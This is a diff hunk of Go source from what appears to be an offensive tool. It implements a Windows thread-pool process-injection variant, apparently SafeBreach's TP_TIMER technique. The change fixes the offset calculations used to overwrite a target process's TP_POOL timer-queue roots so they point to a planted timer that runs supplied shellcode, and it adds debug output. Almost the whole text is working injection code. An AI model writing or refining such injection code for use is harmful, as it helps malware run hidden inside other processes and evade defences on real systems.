@@ -986,28 +986,34 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += fmt.Sprintf("[+] Wrote TP_TIMER structure (%d bytes)\n", bytesWritten)
 
-	// Step 11: Read target TP_POOL's TimerQueue to get addresses for WindowStart and WindowEnd roots
-	// Note: We don't actually need to read the whole TP_POOL, we can calculate the addresses
-	// directly from the Pool pointer we set in the TP_TIMER structure
+	// Step 11: Calculate addresses for WindowStart and WindowEnd roots in target TP_POOL
 	
 	// Step 12: Update TP_POOL's TimerQueue WindowStart and WindowEnd roots to point to our timer
 	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root
-	// We already set tpTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
 	
 	targetTpPoolAddr := workerFactoryInfo.StartParameter
 	
-	// Calculate offsets - use dummy structure for offset calculation
+	// Calculate offsets step by step - Go doesn't handle nested offsetof well
 	var dummyPool FULL_TP_POOL
+	var dummyTimerQueue TPP_TIMER_QUEUE
+	var dummySubQueue TPP_TIMER_SUBQUEUE
 	
-	// These offsets are relative to the start of FULL_TP_POOL
-	windowStartRootAddr := targetTpPoolAddr + uintptr(unsafe.Offsetof(dummyPool.TimerQueue.AbsoluteQueue.WindowStart))
-	windowEndRootAddr := targetTpPoolAddr + uintptr(unsafe.Offsetof(dummyPool.TimerQueue.AbsoluteQueue.WindowEnd))
+	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
+	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
+	windowStartOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
+	windowEndOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))
+	
+	// WindowStart.Root and WindowEnd.Root - Root is first field of TPP_PH so offset is 0
+	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
+	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset
 
 	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
 	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowStartLinks))
 	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(tpTimer.WindowEndLinks))
 
 	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
+	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOffset, absoluteQueueOffset)
+	output += fmt.Sprintf("[*] Debug: windowStartOffset = 0x%X, windowEndOffset = 0x%X\n", windowStartOffset, windowEndOffset)
 	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
 	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
 	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
